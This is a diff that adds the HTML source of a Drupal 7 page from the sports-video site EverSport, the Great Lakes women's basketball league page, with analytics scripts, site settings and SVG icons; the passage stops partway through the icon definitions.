@@ -1,0 +1,1273 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en" dir="ltr"
+  xmlns:og="http://ogp.me/ns#"
+  xmlns:article="http://ogp.me/ns/article#"
+  xmlns:book="http://ogp.me/ns/book#"
+  xmlns:profile="http://ogp.me/ns/profile#"
+  xmlns:video="http://ogp.me/ns/video#"
+  xmlns:product="http://ogp.me/ns/product#"
+  xmlns:content="http://purl.org/rss/1.0/modules/content/"
+  xmlns:dc="http://purl.org/dc/terms/"
+  xmlns:foaf="http://xmlns.com/foaf/0.1/"
+  xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#"
+  xmlns:sioc="http://rdfs.org/sioc/ns#"
+  xmlns:sioct="http://rdfs.org/sioc/types#"
+  xmlns:skos="http://www.w3.org/2004/02/skos/core#"
+  xmlns:xsd="http://www.w3.org/2001/XMLSchema#">
+  <head profile="http://www.w3.org/1999/xhtml/vocab">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="google" content="notranslate" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
+<link rel="shortcut icon" href="http://eversport.tv/sites/all/themes/eversport_theme/favicon.ico" type="image/vnd.microsoft.icon" />
+<link rel="apple-touch-icon" sizes="57x57" href="/sites/default/files/favicons/apple-touch-icon-57x57.png"/>
+<link rel="apple-touch-icon" sizes="60x60" href="/sites/default/files/favicons/apple-touch-icon-60x60.png"/>
+<link rel="apple-touch-icon" sizes="72x72" href="/sites/default/files/favicons/apple-touch-icon-72x72.png"/>
+<link rel="apple-touch-icon" sizes="76x76" href="/sites/default/files/favicons/apple-touch-icon-76x76.png"/>
+<link rel="apple-touch-icon" sizes="114x114" href="/sites/default/files/favicons/apple-touch-icon-114x114.png"/>
+<link rel="apple-touch-icon" sizes="120x120" href="/sites/default/files/favicons/apple-touch-icon-120x120.png"/>
+<link rel="apple-touch-icon" sizes="144x144" href="/sites/default/files/favicons/apple-touch-icon-144x144.png"/>
+<link rel="apple-touch-icon" sizes="152x152" href="/sites/default/files/favicons/apple-touch-icon-152x152.png"/>
+<link rel="apple-touch-icon" sizes="180x180" href="/sites/default/files/favicons/apple-touch-icon-180x180.png"/>
+<link rel="icon" type="image/png" href="/sites/default/files/favicons/favicon-32x32.png" sizes="32x32"/>
+<link rel="icon" type="image/png" href="/sites/default/files/favicons/android-chrome-192x192.png" sizes="192x192"/>
+<link rel="icon" type="image/png" href="/sites/default/files/favicons/favicon-96x96.png" sizes="96x96"/>
+<link rel="icon" type="image/png" href="/sites/default/files/favicons/favicon-16x16.png" sizes="16x16"/>
+<link rel="manifest" href="/sites/default/files/favicons/manifest.json"/>
+<link rel="mask-icon" href="/sites/default/files/favicons/safari-pinned-tab.svg" color="#5bbad5"/>
+<meta name="msapplication-TileColor" content="#2b5797"/>
+<meta name="msapplication-TileImage" content="/sites/default/files/favicons/mstile-144x144.png"/>
+<meta name="theme-color" content="#ffffff"/>
+<meta about="/great-lakes/basketball-womens" typeof="skos:Concept" property="rdfs:label skos:prefLabel" content="Basketball - Women&#039;s" />
+<link rel="alternate" type="application/rss+xml" title="RSS - Basketball - Women&#039;s" href="http://eversport.tv/taxonomy/term/22331/feed" />
+<meta name="generator" content="Drupal 7 (http://drupal.org)" />
+<link rel="canonical" href="http://eversport.tv/great-lakes/basketball-womens" />
+<link rel="shortlink" href="http://eversport.tv/taxonomy/term/22331" />
+<meta property="og:site_name" content="EverSport" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://eversport.tv/great-lakes/basketball-womens" />
+<meta property="og:title" content="Basketball - Women&#039;s" />
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:url" content="http://eversport.tv/great-lakes/basketball-womens" />
+<meta name="twitter:title" content="Basketball - Women&#039;s" />
+    <title>Basketball - Women's | EverSport</title>
+    <link type="text/css" rel="stylesheet" href="http://eversport.tv/sites/default/files/css/css_lQaZfjVpwP_oGNqdtWCSpJT1EMqXdMiU84ekLLxQnc4.css" media="all" />
+<link type="text/css" rel="stylesheet" href="http://eversport.tv/sites/default/files/css/css_1v1p6c3aYqINkya-CnRDeLYnpIDB3CJKRfC0JfKYsxw.css" media="all" />
+<link type="text/css" rel="stylesheet" href="http://eversport.tv/sites/default/files/css/css_T7qRK5gzmKeJhXPKhVTJ334cK4gJwnQZJ3_2CXNwMxs.css" media="all" />
+<link type="text/css" rel="stylesheet" href="http://eversport.tv/sites/default/files/css/css_M7nPKYPzOqI6_uVPmGjTPaSiSn0pu6PLL23vbaYD06E.css" media="all" />
+<link type="text/css" rel="stylesheet" href="http://eversport.tv/sites/default/files/css/css_FhLsXQFj_8UuCHaPUMRWk6NzKTcvCtWHSfBFNOeb-ok.css" media="all" />
+    <script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_235tGRuYJx9rzZAIeA7kGm2tIrKRWn8lKQXe339txPQ.js"></script>
+<script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_pXlBQDos8Wyd0NJC1ndyENUwjIuG161XpzfWINaXk1g.js"></script>
+<script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_IB4IxAA8_R6O4AJ3oL4VcAKcCodSbVF0I64eD-lfa2M.js"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+document.getElementsByTagName("html")[0].classList.remove("no-js");
+//--><!]]>
+</script>
+<script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_ow7QmpbpgXT1B1SrBvCoIAGiJvtF7ILm10lu0-826Ec.js"></script>
+<script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_-FC_-VwlbQ4bL2aQVRAwX5DPLUa_TQEhJrm-x4sM1Kw.js"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+(function(i,s,o,g,r,a,m){i["GoogleAnalyticsObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,"script","//www.google-analytics.com/analytics.js","ga");ga("create", "UA-50755998-1", {"cookieDomain":"auto"});ga("require", "displayfeatures");ga("send", "pageview");
+//--><!]]>
+</script>
+<script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_ELzWj23g5pSb1F1CeyC-vZs5flwkMuSEPojyiyGsw5E.js"></script>
+<script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_62W8FB2-TKfzA7qjBmkS7szVGJAEVd9GSYjnoigamec.js"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+if ('ontouchstart' in window || navigator.msMaxTouchPoints) { document.documentElement.classList.add('touch') } else { document.documentElement.classList.add('no-touch') }
+//--><!]]>
+</script>
+<script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_2q2854cMhDlSrJ8RHEPdxuCsQixRka425JdU5PF9ul0.js"></script>
+<script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_9yf80aUhPI19ttr4JqHLEcQnCIDeXzAzUezs3SoknBE.js"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"eversport_theme","theme_token":"3XrnwE6oBKDLaWjiAKF2dNS1da-1Ln6ZZofbnkoMVqg","jquery_version":"1.7","js":{"sites\/all\/modules\/contrib\/browserclass\/browserclass.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.7\/jquery.min.js":1,"misc\/jquery.once.js":1,"sites\/all\/libraries\/momentjs\/moment.min.js":1,"misc\/drupal.js":1,"sites\/all\/libraries\/momentjs\/moment-timezone-with-data-2010-2020.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/ui\/ui\/minified\/jquery.ui.core.min.js":1,"misc\/jquery.ba-bbq.js":1,"sites\/all\/modules\/custom\/local_time\/js\/local_time.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/ui\/external\/jquery.cookie.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/misc\/jquery.form.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/ui\/ui\/minified\/jquery.ui.datepicker.min.js":1,"misc\/ajax.js":1,"sites\/all\/modules\/contrib\/jquery_update\/js\/jquery_update.js":1,"sites\/all\/modules\/features\/eversport_schedule\/js\/eversport_schedule_header.js":1,"0":1,"sites\/all\/modules\/custom\/eversport_bulk_countries\/js\/eversport_bulk_countries.js":1,"sites\/all\/modules\/features\/eversport_menus\/js\/eversport_menus_registration_modals.js":1,"sites\/all\/modules\/custom\/eversport_register\/js\/eversport_register.js":1,"sites\/all\/modules\/features\/eversport_reports_export\/js\/eversport_reports_export.js":1,"sites\/all\/modules\/features\/eversport_schedule\/js\/eversport_schedule.js":1,"sites\/all\/modules\/custom\/eversport_videofield\/js\/eversport_videofield.js":1,"sites\/all\/modules\/features\/eversport_administer\/js\/eversport_administer.js":1,"sites\/all\/libraries\/jstimezonedetect\/jstz.min.js":1,"sites\/all\/libraries\/jscrollpane\/jquery.mousewheel.js":1,"sites\/all\/libraries\/jscrollpane\/mwheelIntent.js":1,"sites\/all\/libraries\/jscrollpane\/jquery.jscrollpane.min.js":1,"sites\/all\/modules\/contrib\/scrollbar\/scrollbar.js":1,"sites\/all\/modules\/contrib\/dlike\/dlike.js":1,"sites\/all\/modules\/custom\/eversport_social_share\/eversport_social_share.js":1,"misc\/progress.js":1,"sites\/all\/modules\/contrib\/ctools\/js\/modal.js":1,"sites\/all\/modules\/contrib\/ajax_register\/js\/ajax-register.js":1,"sites\/all\/modules\/contrib\/google_analytics\/googleanalytics.js":1,"1":1,"sites\/all\/libraries\/chosen\/chosen.jquery.min.js":1,"sites\/all\/modules\/features\/eversport_menus\/js\/eversport_secondary_menu.js":1,"sites\/all\/libraries\/slick\/slick\/slick.min.js":1,"2":1,"misc\/autocomplete.js":1,"sites\/all\/modules\/contrib\/search_api_live_results\/js\/search_api_live_results.js":1,"sites\/all\/modules\/contrib\/views\/js\/base.js":1,"sites\/all\/modules\/contrib\/views\/js\/ajax_view.js":1,"sites\/all\/modules\/custom\/eversport_stackla\/js\/eversport_stackla.js":1,"sites\/all\/modules\/features\/eversport_events_admin_search\/js\/eversport_events_admin_search.js":1,"sites\/all\/modules\/contrib\/chosen\/chosen.js":1,"sites\/all\/themes\/eversport_theme\/js\/usersettings.js":1,"sites\/all\/themes\/eversport_theme\/js\/navigationmenu.js":1,"sites\/all\/themes\/eversport_theme\/js\/scripts.js":1},"css":{"modules\/system\/system.base.css":1,"misc\/ui\/jquery.ui.core.css":1,"misc\/ui\/jquery.ui.theme.css":1,"misc\/ui\/jquery.ui.datepicker.css":1,"sites\/all\/modules\/contrib\/cache_consistent\/css\/cache_consistent.css":1,"modules\/comment\/comment.css":1,"sites\/all\/modules\/contrib\/date\/date_api\/date.css":1,"sites\/all\/modules\/contrib\/date\/date_popup\/themes\/datepicker.1.7.css":1,"sites\/all\/modules\/contrib\/date\/date_repeat_field\/date_repeat_field.css":1,"sites\/all\/modules\/custom\/eversport_live_ops\/css\/eversport_live_ops.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/features\/eversport_administer\/css\/eversport_administer.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/css\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ckeditor_image2\/ckeditor_image2.theme.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/panels\/css\/panels.css":1,"sites\/all\/libraries\/jscrollpane\/jquery.jscrollpane.css":1,"sites\/all\/modules\/contrib\/dlike\/dlike.css":1,"sites\/all\/modules\/custom\/eversport_social_share\/eversport_social_share.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/modal.css":1,"sites\/all\/modules\/contrib\/ajax_register\/css\/ajax-register.css":1,"sites\/all\/libraries\/slick\/slick\/slick.css":1,"sites\/all\/modules\/custom\/eversport_stackla\/eversport_stackla.css":1,"modules\/taxonomy\/taxonomy.css":1,"sites\/all\/themes\/eversport_theme\/css\/styles.css":1}},"jcarousel":{"ajaxPath":"\/jcarousel\/ajax\/views"},"scrollbar":{"element":".desktop .view-upcoming-videos \u003E .view-content","showArrows":"false","mouseWheelSpeed":10,"arrowButtonSpeed":10,"arrowRepeatFreq":100,"horizontialGutter":4,"verticalGutter":4,"verticalDragMinHeight":0,"verticalDragMaxHeight":99999,"verticalDragMinWidth":0,"verticalDragMaxWidth":99999,"horizontialDragMinHeight":0,"horizontialDragMaxHeight":99999,"horizontialDragMinWidth":0,"horizontialDragMaxWidth":99999,"arrowScrollOnHover":true,"verticalArrowPositions":"split","horizontialArrowPositions":"split","autoReinitialise":false,"autoReinitialiseDelay":500},"localTime":{"user":{"uid":0,"roles":{"1":"anonymous user"},"timezone":""},"config":{"authenticated":1,"theme":true}},"CToolsModal":{"loadingText":"Loading...","closeText":"Close Window","closeImage":"\u003Cimg typeof=\u0022foaf:Image\u0022 src=\u0022http:\/\/eversport.tv\/sites\/all\/modules\/contrib\/ctools\/images\/icon-close-window.png\u0022 alt=\u0022Close window\u0022 title=\u0022Close window\u0022 \/\u003E","throbber":"\u003Cimg typeof=\u0022foaf:Image\u0022 src=\u0022http:\/\/eversport.tv\/sites\/all\/modules\/contrib\/ctools\/images\/throbber.gif\u0022 alt=\u0022Loading\u0022 title=\u0022Loading...\u0022 \/\u003E"},"ctools-ajax-register-style":{"modalSize":{"type":"fixed","width":550,"height":140,"contentRight":30,"contentBottom":0},"modalOptions":{"opacity":0.8,"background-color":"#000000"},"closeText":"","throbber":"\u003Cimg typeof=\u0022foaf:Image\u0022 src=\u0022http:\/\/eversport.tv\/sites\/all\/modules\/contrib\/ajax_register\/images\/ajax-loader.gif\u0022 alt=\u0022\u0022 \/\u003E","animation":"fadeIn","animationSpeed":"fast"},"googleanalytics":{"trackOutbound":1,"trackMailto":1,"trackDownload":1,"trackDownloadExtensions":"7z|aac|arc|arj|asf|asx|avi|bin|csv|doc(x|m)?|dot(x|m)?|exe|flv|gif|gz|gzip|hqx|jar|jpe?g|js|mp(2|3|4|e?g)|mov(ie)?|msi|msp|pdf|phps|png|ppt(x|m)?|pot(x|m)?|pps(x|m)?|ppam|sld(x|m)?|thmx|qtm?|ra(m|r)?|sea|sit|tar|tgz|torrent|txt|wav|wma|wmv|wpd|xls(x|m|b)?|xlt(x|m)|xlam|xml|z|zip"},"chosen":{"selector":"select:visible:not(\u0027.shs-enabled\u0027)","minimum_single":2,"minimum_multiple":2,"minimum_width":150,"options":{"disable_search":false,"disable_search_threshold":0,"search_contains":true,"placeholder_text_multiple":"Choose some options","placeholder_text_single":"Choose an option","no_results_text":"No results match","inherit_select_classes":true}},"eversport_menus_display_mode":"default_schedule","urlIsAjaxTrusted":{"\/great-lakes\/basketball-womens":true},"better_exposed_filters":{"views":{"main_featured_video":{"displays":{"homepage_featured_events":{"filters":[]}}},"promo":{"displays":{"home_promo":{"filters":[]},"league_promo":{"filters":[]}}},"schedule":{"displays":{"week":{"filters":[]}}},"upcoming_videos":{"displays":{"page":{"filters":[]},"archived":{"filters":[]}}},"popular_on_eversport":{"displays":{"block":{"filters":[]}}}}},"views":{"ajax_path":"\/views\/ajax","ajaxViews":{"views_dom_id:c6ee6ec19652618c90418c2d8c96604f":{"view_name":"schedule","view_display_id":"week","view_args":"2019-W18\/22331","view_path":"taxonomy\/term\/22331","view_base_path":"calendar-node-field-date-time\/month","view_dom_id":"c6ee6ec19652618c90418c2d8c96604f","pager_element":0}}}});
+//--><!]]>
+</script>
+  </head>
+  <body class="html not-front not-logged-in no-sidebars page-taxonomy page-taxonomy-term page-taxonomy-term- page-taxonomy-term-22331 great-lakes basketball-womens vocabulary-leagues" >
+<!-- Google Tag Manager -->
+<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-TPPGLL" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<script type="text/javascript">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0];var j=d.createElement(s);var dl=l!='dataLayer'?'&l='+l:'';j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;j.type='text/javascript';j.async=true;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-TPPGLL');</script>
+<!-- End Google Tag Manager -->
+    <div id="skip-link">
+      <a href="#main-content" class="element-invisible element-focusable">Skip to main content</a>
+    </div>
+    <svg style="display:none">
+  <defs>
+    <g id="social-icons--twitter" viewBox="0 0 60 48.738">
+      <path d="M60,5.767c-2.208,0.979-4.577,1.643-7.066,1.938c2.541-1.522,4.487-3.937,5.409-6.805c-2.384,1.41-5.016,2.433-7.821,2.988
+        C48.277,1.492,45.082,0,41.54,0c-6.798,0-12.31,5.512-12.31,12.305c0,0.963,0.108,1.905,0.318,2.804
+        C19.32,14.597,10.251,9.697,4.181,2.25C3.12,4.065,2.516,6.179,2.516,8.436c0,4.271,2.175,8.039,5.474,10.244
+        c-2.017-0.067-3.914-0.623-5.575-1.545v0.153c0,5.962,4.244,10.937,9.872,12.069c-1.031,0.277-2.119,0.432-3.243,0.432
+        c-0.795,0-1.563-0.079-2.317-0.229c1.567,4.893,6.111,8.449,11.496,8.548c-4.212,3.3-9.52,5.261-15.287,5.261
+        c-0.994,0-1.972-0.061-2.936-0.169c5.448,3.498,11.915,5.538,18.866,5.538c22.642,0,35.018-18.754,35.018-35.019l-0.041-1.593
+        C56.264,10.401,58.354,8.234,60,5.767z"/>
+    </g>
+    <g id="social-icons--linkedin" viewBox="0 0 60 60">
+      <path d="M20.999,58.8H20.74h12.859V36.641c0-1.14,0.082-2.251,0.422-3.058C34.962,31.334,37.192,29,40.753,29
+        c4.645,0,6.646,3.472,6.646,8.529V58.8h12.6V36.084c0-11.584-6.354-17.11-14.787-17.11c-6.923,0-9.971,3.826-11.68,6.226h0.066
+        v-5.4h-12.6"/>
+      <path d="M13.799,58.8v-39h-13.2v39H13.799z M7.199,14.562c4.2,0,7.254-2.963,7.254-6.696C14.397,4.078,11.685,1.2,7.269,1.2
+        c-4.387,0-7.268,2.783-7.268,6.6c0,3.704,2.789,6.6,7.091,6.6h0.107V14.562z"/>
+    </g>
+    <g id="social-icons--googleplus" viewBox="0 0 60 60">
+      <polygon points="60,14.137 50.4,14.137 50.4,4.537 46.8,4.537 46.8,14.137 37.2,14.137 37.2,17.737 46.8,17.737 46.8,27.336
+        50.4,27.336 50.4,17.737 60,17.737   "/>
+      <path d="M26.208,33.873c-1.425-1.009-4.148-3.462-4.148-4.902c0-1.69,0.481-2.522,3.023-4.507c2.606-2.038,4.45-4.696,4.45-8.029
+        c0-3.962-1.766-7.099-5.081-8.898h4.995l3.526-3c0,0-11.817,0-15.756,0c-7.064,0-13.71,5.377-13.71,11.573
+        c0,6.337,4.815,11.462,12.001,11.462c0.5,0,0.986-0.003,1.46-0.038c-0.466,0.895-0.799,1.905-0.799,2.948
+        c0,1.759,0.947,3.189,2.144,4.353c-0.906,0-1.778,0.026-2.732,0.026c-8.751,0-15.483,5.574-15.483,11.354
+        c0,5.688,7.382,9.248,16.133,9.248c9.976,0,15.483-5.658,15.483-11.348C31.717,39.549,30.373,36.814,26.208,33.873z M17.792,25.976
+        c-4.06-0.122-7.919-4.541-8.619-9.872c-0.701-5.33,2.02-9.411,6.081-9.29c4.058,0.123,7.917,4.398,8.618,9.729
+        C24.571,21.875,21.849,26.098,17.792,25.976z M16.201,52.947c-6.049,0-10.416-3.826-10.416-8.428c0-4.508,5.418-8.26,11.465-8.193
+        c1.413,0.014,2.729,0.24,3.92,0.629c3.284,2.281,5.639,3.574,6.304,6.174c0.124,0.529,0.192,1.072,0.192,1.625
+        C27.668,49.352,24.702,52.947,16.201,52.947z"/>
+    </g>
+    <g id="social-icons--facebook" viewBox="0 0 28.867 60">
+      <path d="M0,19.803h6v-2.758v-2.76v-0.46c0-2.657,0.126-6.763,2.059-9.304C10.094,1.831,12.917,0,17.723,0
+        c7.83,0,11.145,1.115,11.145,1.115l-1.545,9.197c0,0-2.459-0.748-4.875-0.748c-2.41,0-4.446,0.86-4.446,3.273v0.979v3.224v2.76
+        h9.651l-0.688,9h-8.961V60h-12V28.802h-6L0,19.803"/>
+    </g>
+    <g id="social-icons--facebook--square" viewBox="0 0 60 60">
+      <path d="M56.689,0H3.312C1.482,0,0,1.482,0,3.312v53.378C0,58.518,1.482,60,3.312,60H32V37h-8v-9h8v-6.968
+        c0-7.75,4.916-11.97,11.83-11.97c3.311,0,6.17,0.247,7.17,0.357v8.099l-5.154,0.002c-3.759,0-4.846,1.787-4.846,4.408V28h9.366
+        l-1.168,9H41v23h15.689C58.518,60,60,58.518,60,56.689V3.312C60,1.482,58.518,0,56.689,0z"/>
+    </g>
+    <g id="social-icons--envelope" viewBox="0 0 60 60">
+      <path d="M30,40L0,10h60L30,40z M30,45L17.5,32.5L0,50h60L42.5,32.5L30,45z M45,30l15,15V15L45,30z M0,15v30l15-15L0,15z"/>
+    </g>
+    <g id="social-icons--rss" viewBox="0 0 60 60">
+      <path d="M16.632,51.604c0,4.461-3.724,8.076-8.316,8.076S0,56.064,0,51.604c0-4.459,3.724-8.074,8.316-8.074
+        C12.909,43.529,16.632,47.145,16.632,51.604z"/>
+      <path d="M0.241,32.2L0.213,20.457c25.1,1.309,39.03,19.269,39.374,39.543H27.825C27.629,42.179,15.512,32.848,0.241,32.2z"/>
+      <path d="M0.383,12.616L0.042,0.685C38.611,2.476,59.268,30.464,59.527,60l-12.101-0.17C47.956,40.938,33.98,13.177,0.383,12.616z"
+        />
+    </g>
+    <g id="social-icons--youtube" viewBox="0 0 60 60">
+      <path d="M10.11,1.515h4.5l0.579,2.317l0.49,1.711l0.4,1.675l0.401,1.747l0.312,1.461h0.179l0.312-1.461l0.356-1.747l0.445-1.675
+        l0.445-1.711l0.624-2.317h4.367l-4.634,13.901v9.873h-4.145v-9.873L10.11,1.515z"/>
+      <path d="M29.091,7.36c3.52,0,5.302,1.675,5.302,4.989v8.198c0,3.315-1.782,4.99-5.302,4.99c-3.521,0-5.303-1.675-5.303-4.99V12.35
+        C23.788,9.036,25.57,7.36,29.091,7.36z M29.091,10.212c-0.937,0-1.427,0.57-1.427,1.639v9.195c0,1.034,0.535,1.64,1.427,1.64
+        c0.891,0,1.426-0.605,1.426-1.64v-9.195C30.517,10.782,29.981,10.212,29.091,10.212z"/>
+      <path d="M45.44,25.289l-0.312-1.533c-1.604,1.319-2.539,1.782-3.652,1.782c-0.938,0-1.916-0.428-2.361-0.998
+        c-0.49-0.606-0.624-1.248-0.624-3.065V7.575h3.876v13.794c0,0.891,0.312,1.318,1.024,1.318c0.491,0,0.937-0.179,1.737-0.713V7.575
+        h3.876v17.714H45.44L45.44,25.289z"/>
+      <path d="M50.393,41.653c0-0.746-0.485-1.167-1.296-1.167s-1.296,0.421-1.296,1.167v2.722h2.592V41.653z"/>
+      <path d="M36.136,40.487c-0.445,0-0.852,0.162-1.579,0.647V51.18c0.728,0.486,1.134,0.648,1.579,0.648
+        c0.648,0,0.932-0.389,0.932-1.199v-8.943C37.067,40.844,36.784,40.487,36.136,40.487z"/>
+      <path d="M49.564,28.515H10.436C4.673,28.515,0,33.189,0,38.952v9.099c0,5.763,4.673,10.436,10.436,10.436h39.129
+        C55.327,58.486,60,53.814,60,48.051v-9.099C60,33.189,55.328,28.515,49.564,28.515z M17.02,35.399h-3.686v18.793H9.567V35.399H6.044
+        V32.58H17.02V35.399z M27.225,54.191h-3.239v0.001l-0.283-1.394c-1.459,1.199-2.31,1.62-3.321,1.62
+        c-0.851,0-1.742-0.389-2.147-0.907c-0.445-0.551-0.566-1.134-0.566-2.787V38.087h3.523v12.54c0,0.811,0.283,1.199,0.932,1.199
+        c0.445,0,0.851-0.162,1.58-0.646V38.087h3.522V54.191z M40.59,50.628c0,1.685-0.122,2.269-0.567,2.853
+        c-0.404,0.551-1.296,0.938-2.146,0.938c-1.054,0-1.944-0.485-3.321-1.75v1.523h-3.523V32.58h3.523v7.031
+        c1.377-1.23,2.309-1.717,3.361-1.717c0.811,0,1.701,0.389,2.105,0.906c0.445,0.584,0.567,1.168,0.567,2.885V50.628z M49.016,54.42
+        c-3.038,0-4.739-1.619-4.739-4.535v-7.485c0-3.046,1.621-4.505,4.901-4.505c2.916,0,4.738,1.522,4.738,4.019v4.729H47.8v3.533
+        c0,1.166,0.365,1.652,1.297,1.652c0.445,0,0.852-0.195,1.053-0.486c0.202-0.291,0.243-0.646,0.243-1.813c0-0.291,0-0.519,0-0.974
+        h3.522v0.584c0.041,0.422,0.041,0.713,0.041,0.875C53.956,52.865,52.215,54.42,49.016,54.42z"/>
+    </g>
+    <g id="social-icons--youtube-play" viewBox="0 0 60 60">
+      <path d="M7.301,50.685c-5.727-1.195-7.193-5.246-7.229-19.981C0.046,20.294,0.479,16.756,2.197,13.344
+        C3.529,10.698,5.132,9.86,9.8,9.369c4.532-0.477,28.615-0.501,38.188-0.039c13.349,0.844,11.83,7.092,11.979,19.48
+        c0.156,12.844-0.189,15.638-2.354,18.913c-2.141,3.245-1.319,3.143-26.137,3.263C18.874,51.05,8.424,50.919,7.301,50.685
+        L7.301,50.685z M39.6,29.397l-14.1-9.3v19.2L39.6,29.397z"/>
+    </g>
+    <g id="social-icons--globe-info" viewBox="0 0 14 14">
+      <path d="M11.6,7c0,3.574-2.065,6.483-4.6,6.483c-2.537,0-4.599-2.909-4.599-6.483c0-3.573,2.062-6.481,4.599-6.481 C9.534,0.519,11.6,3.427,11.6,7L11.6,7z M7,0C4.178,0,1.881,3.14,1.881,7c0,3.861,2.296,7,5.118,7s5.118-3.14,5.118-7 C12.117,3.14,9.821,0,7,0L7,0z"/>
+      <path d="M8.962,7c0,3.82-1.035,6.483-1.963,6.483c-0.929,0-1.963-2.663-1.963-6.483S6.07,0.519,7,0.519 C7.928,0.519,8.962,3.18,8.962,7L8.962,7z M7,0C5.387,0,4.517,3.606,4.517,7c0,3.395,0.871,7,2.483,7c1.611,0,2.483-3.606,2.483-7 C9.482,3.606,8.61,0,7,0L7,0z"/>
+      <path d="M13.482,7c0,3.574-2.908,6.483-6.483,6.483c-3.574,0-6.481-2.909-6.481-6.483c0-3.573,2.908-6.481,6.481-6.481 C10.574,0.519,13.482,3.427,13.482,7L13.482,7z M7,0C3.14,0,0,3.14,0,7c0,3.861,3.14,7,7,7c3.861,0,7-3.14,7-7C14,3.14,10.86,0,7,0 L7,0z"/>
+      <path d="M0.327,6.95h13.345v0.519H0.327V6.95L0.327,6.95z"/>
+      <path d="M1.187,3.45h11.626v0.52H1.187V3.45L1.187,3.45z"/>
+      <path d="M1.187,10.45h11.626v0.519H1.187V10.45L1.187,10.45z"/>
+    </g>
+    <g id="social-icons--calendar" viewBox="0 0 14 14">
+      <path d="M3.5,3.923C3.57,3.923,4,3.63,4,3.27V0.654C4,0.292,3.57,0,3.5,0S3,0.292,3,0.654V3.27C3,3.63,3.43,3.923,3.5,3.923z"/>
+      <path d="M10.5,3.923c0.182,0,0.5-0.293,0.5-0.654V0.654C11,0.292,10.682,0,10.5,0S10,0.292,10,0.654V3.27 C10,3.63,10.318,3.923,10.5,3.923z"/>
+      <path d="M12.583,2H12v1.27c0,0.72-0.777,1.307-1.5,1.307S9,3.99,9,3.27V2H5v1.27c0,0.72-0.778,1.307-1.5,1.307S2,3.99,2,3.27V2 H1.417C0.634,2,0,3.259,0,4.054v8.508C0,13.354,0.634,14,1.417,14h6.429h1.308h3.429C13.366,14,14,13.354,14,12.562V9.154V6.539 V4.054C14,3.259,13.367,2,12.583,2z M12,9.154v3.408C12,12.631,12.643,12,12.583,12H9.154H7.846H1.417C1.357,12,2,12.631,2,12.562V6 h10V9.154z"/>
+      <rect x="9" y="9" width="2" height="2"/>
+      <rect x="3" y="7" width="2" height="1"/>
+      <rect x="3" y="9" width="2" height="2"/>
+      <rect x="6" y="7" width="2" height="1"/>
+      <rect x="6" y="9" width="2" height="2"/>
+      <rect x="9" y="7" width="2" height="1"/>
+    </g>
+    <g id="social-icons--calendar--large" viewBox="0 0 17 17">
+      <path d="M3.5,3.923C3.57,3.923,4,3.63,4,3.27V0.654C4,0.292,3.57,0,3.5,0S3,0.292,3,0.654V3.27C3,3.63,3.43,3.923,3.5,3.923z"/>
+      <path d="M13.5,3.923c0.181,0,0.5-0.293,0.5-0.654V0.654C14,0.292,13.681,0,13.5,0S13,0.292,13,0.654V3.27 C13,3.63,13.319,3.923,13.5,3.923z"/>
+      <path d="M15.583,2H15v1.27c0,0.72-0.778,1.307-1.5,1.307S12,3.99,12,3.27V2H5v1.27c0,0.72-0.778,1.307-1.5,1.307S2,3.99,2,3.27V2 H1.417C0.634,2,0,3.259,0,4.054v11.508C0,16.354,0.634,17,1.417,17h6.429h1.308h6.429C16.366,17,17,16.354,17,15.562V9.154V6.539 V4.054C17,3.259,16.367,2,15.583,2z M15,9.154v6.408C15,15.631,15.643,15,15.583,15H9.154H7.846H1.417C1.357,15,2,15.631,2,15.562V6 h13V9.154z"/>
+      <rect x="11" y="11" width="3" height="3"/><rect x="3" y="7" width="3" height="3"/><rect x="3" y="11" width="3" height="3"/><rect x="7" y="7" width="3" height="3"/><rect x="7" y="11" width="3" height="3"/><rect x="11" y="7" width="3" height="3"/>
+    </g>
+    <g id="social-icons--grid" viewBox="0 0 19 14">
